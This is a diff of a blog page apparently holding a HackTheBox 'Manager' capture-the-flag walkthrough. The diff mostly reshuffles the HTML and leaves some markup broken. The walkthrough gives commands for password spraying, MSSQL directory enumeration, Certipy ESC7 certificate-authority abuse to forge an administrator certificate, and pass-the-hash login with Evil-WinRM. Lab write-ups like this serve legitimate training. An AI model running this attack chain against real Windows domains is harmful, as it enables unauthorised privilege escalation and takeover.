@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Manager-Windows-Medium</h1>
   
@@ -69,116 +61,119 @@
 <p>HackTheBox: Medium</p>
 
 <h2 id="1-enumeration">1: Enumeration</h2>
-
+<p><br /><br /></p>
 <ul>
-  <li>nmap scanning</li>
-</ul>
-
-<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled.png" alt="Untitled" /></p>
-
-<p>With Rustscan we found</p>
-
-<blockquote>
-  <p>445 SMB
+  <li>nmap scanning
+<br /><br />
+<img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled.png" alt="Untitled" />
+<br /><br />
+With Rustscan we found 
+<br /><br />
+    <blockquote>
+      <p>445 SMB
 1433 mssql
 464 kpass
 88 Kerberos</p>
 
-</blockquote>
+      <p><br /><br />
+<img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_1.png" alt="Untitled" />
+<br /><br />
+That’s how we find active users in the machine
+<br /><br />
+~Spray all the users found using Crackmapexec
+<br /><br />
+<img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_2.png" alt="Untitled" />
+<br /><br /></p>
+      <h2 id="2-user-flag">2: User flag</h2>
+      <p><br /><br />
+Crackmapexec is a useful tool but it is not maintained anymore so we are going to chanche a .py file something with the ssl version.</p>
 
-<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_1.png" alt="Untitled" /></p>
-
-<p>That’s how we find active users in the machine</p>
-
-<p>~Spray all the users found using Crackmapexec</p>
-
-<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_2.png" alt="Untitled" /></p>
-
-<h2 id="2-user-flag">2: User flag</h2>
-
-<blockquote>
-  <p>Crackmapexec is a useful tool but it is not maintained anymore so we are going to chanche a .py file something with the ssl version.</p>
-
-</blockquote>
-
-<p>Enum shared resources</p>
+      <p><br /><br />
+Enum shared resources</p>
+    </blockquote>
+  </li>
+</ul>
 
 <aside>
 💡 Impacket-smbclient
 Impacket-mssqlclient
 
 </aside>
-
-<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_3.png" alt="Untitled" /></p>
-
-<p>Once inside of shared resources we were able to access the database tables, we started looking into their contents. We hace content in xp_dirtree</p>
-
-<p>We can check documentation to find web page resources</p>
-
+<p><br /><br />
+<img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_3.png" alt="Untitled" />
+<br /><br />
+Once inside of shared resources we were able to access the database tables, we started looking into their contents. We hace content in xp_dirtree
+<br /><br />
+We can check documentation to find web page resources 
+<br /><br /></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> EXEc xp_dirtree <span class="s1">'C:\inetpub\wwwroot'</span>, 1, 1<span class="p">;</span>
 </code></pre></div></div>
-
-<p>find a website backup  with creds, use wget to download it locally, using evil-wirm to access</p>
-
-<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_4.png" alt="Untitled" /></p>
-
+<p><br /><br />
+find a website backup  with creds, use wget to download it locally, using evil-wirm to access
+<br /><br />
+<img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_4.png" alt="Untitled" />
+<br /><br /></p>
 <h2 id="3-priv-esc">3: Priv esc</h2>
-
+<p><br /><br /></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /groups /priv
 </code></pre></div></div>
-
-<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_5.png" alt="Untitled" /></p>
-
-<p>Evil winrm a advantage, the capacity of upload and create files from remote machine</p>
-
+<p><br /><br />
+<img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_5.png" alt="Untitled" />
+<br /><br />
+Evil winrm a advantage, the capacity of upload and create files from remote machine
+<br /><br /></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload cerfity.exe
 ./Certify.exe find /vulnerable
 </code></pre></div></div>
-
+<p><br /><br /></p>
 <blockquote>
   <p>Now we’re gonna use certipy, with an auth we get  specific vulnerabilities and exploit them</p>
 
+  <p><br /><br /></p>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy find <span class="nt">-u</span> user@--- <span class="nt">-p</span> <span class="s2">"rtgre"</span> <span class="nt">-enable</span> <span class="nt">-vulnearable</span> <span class="nt">-target</span> manager.htb
+</code></pre></div>  </div>
+  <p><br /><br />
+Vulnerable to ESC7 find mor info <a href="https://github.com/ly4k/Certipy#esc7">HERE</a> and exploit
+<br /><br />
+```bash
+#Add an officer named ‘raven’ to the CA named ‘manager-DC01-CA’ given managecertificate rights
+certipy ca -ca ‘manager-DC01-CA’ -add-officer raven -username raven@manager.htb -password ‘<password>'</password></p>
 </blockquote>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy find <span class="nt">-u</span> user@--- <span class="nt">-p</span> <span class="s2">"rtgre"</span> <span class="nt">-enable</span> <span class="nt">-vulnearable</span> <span class="nt">-target</span> manager.htb
+<p>#Enable a certificate template named ‘SubCA’ for the CA ‘manager-DC01-CA’.
+certipy ca -ca ‘manager-DC01-CA’ -enable-template SubCA -username raven@manager.htb -password ‘<password>'</password></p>
+
+<p>#Submit a certificate request for the template ‘SubCA’ to the CA ‘manager-DC01-CA’.
+#It fails but we just need the private key to sign the certificate to issue directly
+certipy req -username raven@manager.htb -password ‘<password>' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb</password></p>
+
+<p>#Issue the certificate based on the request submitted.
+certipy ca -ca “manager-DC01-CA” -issue-request <private_key_id> -username 'raven@manager.htb' -password '<password>'</password></private_key_id></p>
+
+<p>#Retrieve the issued certificate.
+certipy req -username ‘raven@manager.htb’ -password ‘<password>' -ca "manager-DC01-CA" -target manager.htb -retrieve <private_key_id></private_key_id></password></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br/&gt;&lt;br/&gt;
+You’ve got a hash for admin with
+&lt;br/&gt;&lt;br/&gt;
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
 </code></pre></div></div>
-
-<p>Vulnerable to ESC7 find mor info <a href="https://github.com/ly4k/Certipy#esc7">HERE</a> and exploit</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Add an officer named 'raven' to the CA named 'manager-DC01-CA' given managecertificate rights</span>
-certipy ca <span class="nt">-ca</span> <span class="s1">'manager-DC01-CA'</span> <span class="nt">-add-officer</span> raven <span class="nt">-username</span> raven@manager.htb <span class="nt">-password</span> <span class="s1">'&lt;password&gt;'</span> 
-
-<span class="c">#Enable a certificate template named 'SubCA' for the CA 'manager-DC01-CA'.</span>
-certipy ca <span class="nt">-ca</span> <span class="s1">'manager-DC01-CA'</span> <span class="nt">-enable-template</span> SubCA <span class="nt">-username</span> raven@manager.htb <span class="nt">-password</span> <span class="s1">'&lt;password&gt;'</span> 
-
-<span class="c">#Submit a certificate request for the template 'SubCA' to the CA 'manager-DC01-CA'.</span>
-<span class="c">#It fails but we just need the private key to sign the certificate to issue directly</span>
-certipy req <span class="nt">-username</span> raven@manager.htb <span class="nt">-password</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-ca</span> <span class="s1">'manager-DC01-CA'</span> <span class="nt">-target</span> manager.htb <span class="nt">-template</span> SubCA <span class="nt">-upn</span> administrator@manager.htb 
-
-<span class="c">#Issue the certificate based on the request submitted.</span>
-certipy ca <span class="nt">-ca</span> <span class="s2">"manager-DC01-CA"</span> <span class="nt">-issue-request</span> &lt;private_key_id&gt; <span class="nt">-username</span> <span class="s1">'raven@manager.htb'</span> <span class="nt">-password</span> <span class="s1">'&lt;password&gt;'</span> 
-
-<span class="c">#Retrieve the issued certificate.</span>
-certipy req <span class="nt">-username</span> <span class="s1">'raven@manager.htb'</span> <span class="nt">-password</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-ca</span> <span class="s2">"manager-DC01-CA"</span> <span class="nt">-target</span> manager.htb <span class="nt">-retrieve</span> &lt;private_key_id&gt;
-</code></pre></div></div>
-
-<p>You’ve got a hash for admin with</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 10.10.11.236
-</code></pre></div></div>
-
-<p>Whether for some reason it shows you an error message try to sync servers like this</p>
-
+<p><br /><br />
+Whether for some reason it shows you an error message try to sync servers like this
+<br /><br /></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>ntpdate <span class="nt">-u</span> manager.htb
 </code></pre></div></div>
-
-<p>And finally</p>
-
+<p><br /><br />
+And finally
+<br /><br /></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.11.236 <span class="nt">-u</span> administrator <span class="nt">-H</span> password
 </code></pre></div></div>
-
-<p>Machine pwned!!!
+<p><br /><br />
+Machine pwned!!!
 <script src="/assets/js/matrix-overlay.js"></script></p>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
+
 
 </div>
 
